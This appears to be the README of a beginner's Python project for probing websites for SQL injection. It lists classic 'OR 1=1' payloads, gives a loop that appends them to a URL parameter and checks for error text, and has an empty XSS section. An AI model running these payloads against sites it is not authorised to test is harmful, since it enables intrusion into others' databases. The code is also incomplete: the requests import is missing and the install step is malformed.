=============================================
<BR>
               SQL INJECTION
<BR>
=============================================
Define the URL of the target website:
<br>
url = "http://example.com/vulnerable_page.php"

Define a list of SQL injection payloads to test:
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR 1=1-- ",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' /* ",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1' OR '1'='1' /* "
]

Define a function to test for SQL injection:
def test_sql_injection(url, payloads):
    for payload in payloads:
        # Construct the full URL with the payload
        test_url = f"{url}?id={payload}"

        try:
            # Send the HTTP request
            response = requests.get(test_url)

            # Check if the payload is reflected in the response
            if "SQL" in response.text or "syntax" in response.text or "error" in response.text:
                print(f"Potential SQL injection vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} did not cause an SQL error.")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

Call the function to run the test:
test_sql_injection(url, payloads)



===========================================
                   XSS
===========================================














SQLI.py & XSS.py the script for testing vulnerability on the website with python language.

You can run this script for testing the website with following step:

pip install requirements
<br>
chmod +x filename.py
<br>
python3 filename.py

put target url for checking vulnerable of SQL Injection



Happy Hacking..!!
